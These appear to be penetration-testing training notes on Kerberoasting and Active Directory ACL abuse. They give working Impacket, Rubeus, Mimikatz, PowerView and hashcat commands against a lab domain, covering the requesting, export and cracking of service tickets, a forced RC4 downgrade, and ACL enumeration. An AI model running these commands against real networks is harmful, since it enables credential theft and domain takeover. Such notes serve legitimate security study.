## Keberoasting

Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments. This attack targets Service Principal Names (SPN) accounts. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running. Domain accounts are often used to run services to overcome the network authentication limitations of built-in accounts such as NT AUTHORITY\LOCAL SERVICE. Any domain user can request a Kerberos ticket for any service account in the same domain. This is also possible across forest trusts if authentication is permitted across the trust boundary. All you need to perform a Kerberoasting attack is an account's cleartext password (or NTLM hash), a shell in the context of a domain user account, or SYSTEM level access on a domain-joined host.

Domain accounts running services are often local administrators, if not highly privileged domain accounts. Due to the distributed nature of systems, interacting services, and associated data transfers, service accounts may be granted administrator privileges on multiple servers across the enterprise. Many services require elevated privileges on various systems, so service accounts are often added to privileged groups, such as Domain Admins, either directly or via nested membership. Finding SPNs associated with highly privileged accounts in a Windows environment is very common. Retrieving a Kerberos ticket for an account with an SPN does not by itself allow you to execute commands in the context of this account. However, the ticket (TGS-REP) is encrypted with the service account’s NTLM hash, so the cleartext password can potentially be obtained by subjecting it to an offline brute-force attack with a tool such as Hashcat.

## Kerberoasting - Linux

Depending on your position in a network, this attack can be performed in multiple ways:

- From a non-domain joined Linux host using valid domain user credentials.
- From a domain-joined Linux host as root after retrieving the keytab file.
- From a domain-joined Windows host authenticated as a domain user.
- From a domain-joined Windows host with a shell in the context of a domain account.
- As SYSTEM on a domain-joined Windows host.
- From a non-domain joined Windows host using runas /netonly.

### Impacket Kerberoasting

```bash
## Install Impacket using Pip
sudo python3 -m pip install .

## List SPN accounts with GetUserSPNs.py
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend

## Request all TGS tickets
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 

## Request for specific account TGS ticket
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev

## Save TGS ticket for offline cracking
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs

## Cracking ticket offline with Hashcat
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
```

## Kerberoasting - Windows

Before tools such as Rubeus existed, stealing or forging Kerberos tickets was a complex, manual process. As the tactic and defenses have evolved, we can now perform Kerberoasting from Windows in multiple ways. To start down this path, we will explore the manual route and then move into more automated tooling.

### Semi-Manual Method

```powershell
## Enumerate SPN
setspn.exe -Q */*

## Targeting single user
## Request and load TGS ticket into memory for future Mimikatz
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

## Retrieving all tickets 
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

## Extract using Mimikatz
mimikatz # base64 /out:true
mimikatz # kerberos::list /export 
```

```bash
## Prepare file for correct format for cracking
echo "<base64 blob>" |  tr -d \\n
cat encoded_file | base64 -d > sqldev.kirbi
python2.7 kirbi2john.py sqldev.kirbi

## Confirm hash can be fed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat

## Crack using hashcat
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
```

### Automated Method

```powershell
## Use PowerView
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname

## Target specific user
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

## Export all TGS tickets to csv
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

```powershell
## Use Rubeus
## Get some statistics
.\Rubeus.exe kerberoast /stats

## Accounts with admincount attribute set to 1
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

## Check supported encryption types
## Hashes that begin with $krb5tgs$23$*, an RC4 (type 23) encrypted ticket
## AES-256 (type 18) encrypted hash or hash that begins with $krb5tgs$18$* -- longer to crack
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

## Force downgrade of hash to RC4
.\Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap
```

## Access Control Entities

### Why are ACEs Important

ACL abuse can be a great way for us to move laterally/vertically and even achieve full domain compromise.

There are 2 types of ACLs:

1. Discretionary Access Control List (DACL)
2. System Access Control List (SACL)

4 specific ACEs to highlight the power of ACL attacks:

| Attack | Description |
|--------|-------------|
| ForceChangePassword | Gives us the right to reset a user's password without first knowing their password (should be used cautiously and typically best to consult our client before resetting passwords). |
| GenericWrite | Gives us the right to write to any non-protected attribute on an object. If we have this access over a user, we could assign them an SPN and perform a Kerberoasting attack (which relies on the target account having a weak password set). Over a group means we could add ourselves or another security principal to a given group. Finally, if we have this access over a computer object, we could perform a resource-based constrained delegation attack which is outside the scope of this module. |
| AddSelf | Shows security groups that a user can add themselves to. |
| GenericAll | Grants us full control over a target object. Again, depending on if this is granted over a user or group, we could modify group membership, force change a password, or perform a targeted Kerberoasting attack. If we have this access over a computer object and the Local Administrator Password Solution (LAPS) is in use in the environment, we can read the LAPS password and gain local admin access to the machine which may aid us in lateral movement or privilege escalation in the domain if we can obtain privileged controls or gain some sort of privileged access. |


Breakdown of the varying possible ACE attacks and the tools to perform these attacks from both Windows and Linux (if applicable). 
![Alt text](Assets/ACL_attacks_graphic.png)


### ACL Enumeration

```powershell
## PowerView
Import-Module .\PowerView.ps1

## Target specific user
$sid = Convert-NameToSid wley 
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 

## Reverse Search & Mapping to GUID 
$guid= "00299570-246d-11d0-a768-00aa006e0529"
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
```

```powershell
## PowerView
## Create list of domain users
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt

## For-loop to get ACL information
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
```

*Bloodhound can perform the same features but in a simpler manner through its GUI.*

